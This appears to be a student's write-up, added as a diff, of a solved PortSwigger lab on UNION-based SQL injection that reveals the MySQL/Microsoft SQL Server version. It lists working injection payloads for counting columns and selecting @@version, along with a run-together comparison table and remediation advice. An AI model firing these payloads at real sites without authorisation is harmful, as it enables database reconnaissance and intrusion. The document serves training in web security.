@@ -1,0 +1,50 @@
+Lab 4: SQL Injection - Query Database Version on MySQL and Microsoft
+Platform: PortSwigger Web Security Academy
+Level: Practitioner
+Category: SQL Injection - Examining the Database
+Status: ✅ Solved
+
+Objective
+Retrieve the database type and version on a MySQL or Microsoft SQL Server using UNION-based SQL injection.
+
+Key Concept
+On MySQL/Microsoft, comments are written as -- (with a space after) or #. The version variable is @@version.
+
+Steps to Solve
+
+Found the injectable category parameter
+Determined number of columns:
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- (error = 2 columns)
+
+Found string-compatible column:
+
+' UNION SELECT 'a',NULL-- -
+
+Injected version payload:
+
+' UNION SELECT @@version,NULL-- -
+
+MySQL/Microsoft version string displayed on page ✅
+
+
+Tool Used
+
+Burp Suite
+Browser
+
+
+Difference from Oracle Lab
+OracleMySQL/MicrosoftComment syntax---- - or #Version querySELECT banner FROM v$versionSELECT @@versionDual table neededYes (FROM dual)No
+
+Impact
+Medium — Version disclosure enables targeted exploitation using known CVEs for that database version.
+
+Remediation
+Hide database error messages from users
+Use parameterized queries
+Apply latest database security patches.
+
+
